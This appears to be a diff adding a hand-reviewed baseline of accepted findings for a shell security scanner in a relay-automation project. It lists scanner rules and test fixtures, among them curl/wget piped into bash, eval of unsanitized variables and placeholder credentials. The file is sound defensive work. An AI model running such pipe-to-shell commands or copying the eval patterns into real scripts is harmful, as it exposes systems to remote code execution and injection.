@@ -1,0 +1,61 @@
+# security-scan-baseline.txt — GH-64 pre-approved findings
+#
+# Hand-reviewed and hand-maintained (relay-automation/hooks/security-scan.sh never writes this
+# file). Format: <file>	<rule>	<exact matched line text> — one entry per line, tab-separated.
+# A finding here is still PRINTED (labeled "baselined"), just doesn't fail the scan — nothing is
+# hidden, per GUIDING-PRINCIPLES.md #8. Matching is by exact line TEXT, not line number: a
+# reformatted flagged line drops out of the baseline and must be re-reviewed (deliberate).
+#
+# To review/regenerate candidate rows: bash relay-automation/hooks/security-scan.sh --no-baseline --tsv
+# Every row below was reviewed 2026-07-01 (GH-64): each is a doc/prose comment matching a pattern
+# in TEXT (not an actual secret/credential), a reviewed operator-configured dispatcher eval
+# (poll.sh/relay-drive.sh/marathon-drive.sh/improve-loop.sh — trusted config, not attacker input),
+# or the security-scan test suite's own intentional fixtures. No real secret leak in any row.
+#
+relay-automation/codex-turn.sh	credential-literal	# credits — even if some ambient session exported a key. Set CODEX_ALLOW_API_KEY=1 to opt back in.
+relay-automation/consult.sh	credential-literal	  # never per-token API credits (CODEX_ALLOW_API_KEY=1 to opt back in). See codex-turn.sh.
+relay-automation/hooks/security-scan.sh	eval-unsanitized	#   R1  eval of variable / unsanitized input     eval "$foo" / eval $foo
+relay-automation/hooks/security-scan.sh	eval-unsanitized	# Matches: eval "$foo", eval $foo, eval "$(…)", eval $(…)
+relay-automation/hooks/security-scan.sh	pipe-remote-shell	#   R2  piped remote execution                   curl/wget ... | sh/bash
+relay-automation/hooks/security-scan.sh	credential-literal	#   R7  Literal credential assignment            password=/secret=/api_key= with a value
+relay-automation/improve-loop.sh	eval-unsanitized	if ! eval "$ORACLE_CMD" >/dev/null 2>&1; then echo "improve-loop: baseline FAILS the oracle — refusing to optimize a broken artifact" >&2; exit 3; fi
+relay-automation/improve-loop.sh	eval-unsanitized	  eval "$BUILD_CMD" >/dev/null 2>&1 || true
+relay-automation/improve-loop.sh	eval-unsanitized	  op=1; eval "$ORACLE_CMD" >/dev/null 2>&1 || op=0
+relay-automation/marathon-drive.sh	eval-unsanitized	    ( [[ -n "$TARGET_ROOT" ]] && cd "$TARGET_ROOT"; eval "$PRE_ADVANCE_CMD" ) || gate_exit=$?
+relay-automation/poll.sh	eval-unsanitized	# `eval "$RUNNER_CMD"` exec'd the wrong token, e.g. `/Users/.../GH: not found`.)
+relay-automation/poll.sh	eval-unsanitized	  if [[ -x "$1" ]]; then "$1"; else eval "$1"; fi
+relay-automation/relay-drive.sh	eval-unsanitized	    eval "$AGENT_CMD"
+test/find-harness.sh	eval-unsanitized	ok(){ if eval "$2"; then echo "  PASS: $1"; pass=$((pass+1)); else echo "  FAIL: $1"; fail=$((fail+1)); fi; }
+test/marathon-drive.sh	eval-unsanitized	if [[ -x "$acmd" ]]; then "$acmd"; else eval "$acmd"; fi
+test/poll-driver.sh	eval-unsanitized	# puts a space in that path and the old `eval "$RUNNER_CMD"` split it (exec'd "/Users/.../GH").
+test/poll-relay.sh	eval-unsanitized	# `eval "$AGENT_CMD"` split on the space → exec'd the wrong token → the turn-taker never ran. The fix:
+test/registry-lock-concurrency.sh	eval-unsanitized	ok(){ if eval "$2"; then echo "  PASS: $1"; pass=$((pass+1)); else echo "  FAIL: $1"; fail=$((fail+1)); fi; }
+test/relay-dep-drift.sh	eval-unsanitized	ok(){ if eval "$2"; then echo "  PASS: $1"; pass=$((pass+1)); else echo "  FAIL: $1"; fail=$((fail+1)); fi; }
+test/relay-turn-handoff.sh	eval-unsanitized	ok(){ if eval "$2"; then echo "  PASS: $1"; pass=$((pass+1)); else echo "  FAIL: $1"; fail=$((fail+1)); fi; }
+test/relay-xyz-skill-guard.sh	eval-unsanitized	run "sess-loc" Bash 'eval "$(bash skills/relay-xyz/find-harness.sh --env)"'
+test/security-scan.sh	eval-unsanitized	eval "$UNSANITIZED"
+test/security-scan.sh	eval-unsanitized	check_pattern "eval-var"         'eval "$MYVAR"'
+test/security-scan.sh	eval-unsanitized	check_pattern "eval-dollar"      'eval $MYVAR'
+test/security-scan.sh	pipe-remote-shell	curl https://example.com/install.sh | bash
+test/security-scan.sh	pipe-remote-shell	check_pattern "pipe-curl-sh"     'curl https://example.com/x.sh | sh'
+test/security-scan.sh	pipe-remote-shell	check_pattern "pipe-wget-bash"   'wget -qO- http://x.io/go.sh | bash'
+test/security-scan.sh	aws-access-key	AWS_KEY="AKIAIOSFODNN7EXAMPLE"
+test/security-scan.sh	aws-access-key	check_pattern "aws-key"          'export KEY=AKIAIOSFODNN7EXAMPLE'
+test/security-scan.sh	pem-private-key	echo "-----BEGIN RSA PRIVATE KEY-----"
+test/security-scan.sh	pem-private-key	check_pattern "pem-rsa"          '-----BEGIN RSA PRIVATE KEY-----'
+test/security-scan.sh	pem-private-key	check_pattern "pem-openssh"      '-----BEGIN OPENSSH PRIVATE KEY-----'
+test/security-scan.sh	github-pat	GH_TOKEN="ghp_aBcDeFgHiJkLmNoPqRsTuVwXyZ1234567890"
+test/security-scan.sh	github-pat	check_pattern "github-pat"       'TOKEN=ghp_aBcDeFgHiJkLmNoPqRsTuVwXyZ1234567890'
+test/security-scan.sh	slack-token	SLACK_BOT="xoxb-secrettoken"
+test/security-scan.sh	slack-token	check_pattern "slack-bot"        'SLACK=xoxb-abc123'
+test/security-scan.sh	credential-literal	password="hunter2secret"
+test/security-scan.sh	credential-literal	check_pattern "cred-password"    'password="mysecretpass"'
+test/security-scan.sh	credential-literal	check_pattern "cred-api-key"     'api_key=supersecretvalue'
+test/xyz-vendor.sh	eval-unsanitized	( unset HARNESS; eval "$(cat "$WORK/plain.env")"; [ "$HARNESS" = "$ROOT" ] ) \
+
+# --- added 2026-07-01: GH-64's own baseline-mechanism test fixtures (test/security-scan.sh) ---
+test/security-scan.sh	eval-unsanitized	eval "$KNOWN_GOOD"
+test/security-scan.sh	eval-unsanitized	eval "$BRAND_NEW_ONE"
+test/security-scan.sh	eval-unsanitized	printf '# comment line, ignored\n\nmixed.sh\teval-unsanitized\teval "$KNOWN_GOOD"\n' > "$BASE_FILE"
+test/security-scan.sh	eval-unsanitized	printf '# comment\nmixed.sh\teval-unsanitized\teval "$KNOWN_GOOD"\nmixed.sh\teval-unsanitized\teval "$BRAND_NEW_ONE"\n' > "$BASE_FILE"
+test/security-scan.sh	eval-unsanitized	TSV_EXPECT="$(printf 'mixed.sh\teval-unsanitized\teval "$KNOWN_GOOD"')"
